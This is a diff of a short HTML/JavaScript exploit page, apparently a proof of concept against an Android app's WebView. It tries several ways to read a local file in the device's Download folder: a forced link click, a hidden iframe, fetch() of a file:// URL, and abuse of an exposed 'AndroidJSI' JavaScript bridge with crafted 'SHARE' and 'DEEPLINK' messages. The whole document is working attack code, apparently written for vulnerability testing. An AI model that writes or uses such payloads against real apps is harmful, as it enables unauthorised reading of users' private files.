@@ -1,39 +1,32 @@
-<!DOCTYPE html>
-<html>
-<head><title>Exploit</title></head>
-<body>
 <script>
-// Multi-vector file access attack
-function attemptFileAccess() {
-    const targetFile = 'file:///storage/emulated/0/Download/WTF.txt';
-    
-    // Vector 1: Direct navigation (highest success rate)
-    setTimeout(() => {
-        window.location.href = targetFile;
-    }, 2000);
-    
-    // Vector 2: JavaScript interface abuse
-    if (typeof AndroidJSI !== 'undefined') {
-        try {
-            AndroidJSI.onReceiveMessage(JSON.stringify({
-                action: "SHARE",
-                data: { 
-                    message: "File access attempt",
-                    screenshot: false 
-                }
-            }));
-        } catch(e) {}
-    }
-    
-    // Vector 3: Create visible link for user interaction
+// Try multiple methods to access the file
+function readFile() {
+    // Method 1: Direct navigation
     const link = document.createElement('a');
-    link.href = targetFile;
-    link.innerText = 'Click to view file content';
-    link.style.fontSize = '20px';
-    document.body.appendChild(link);
+    link.href = 'file:///sdcard/Download/WTF.txt';
+    link.target = '_blank';
+    link.click();
+    
+    // Method 2: Iframe loading
+    const iframe = document.createElement('iframe');
+    iframe.src = 'file:///sdcard/Download/WTF.txt';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    
+    // Method 3: Try fetch (will likely fail but worth trying)
+    fetch('file:///sdcard/Download/WTF.txt')
+        .then(response => response.text())
+        .then(data => alert('Fetch worked: ' + data))
+        .catch(e => console.log('Fetch failed as expected: ' + e));
+    
+    // Method 4: Use JavaScript interface
+    if (typeof AndroidJSI !== 'undefined') {
+        AndroidJSI.onReceiveMessage(JSON.stringify({
+            action: "DEEPLINK",
+            data: { deeplinkUrl: "file:///sdcard/Download/WTF.txt" }
+        }));
+    }
 }
 
-attemptFileAccess();
+readFile();
 </script>
-</body>
-</html>
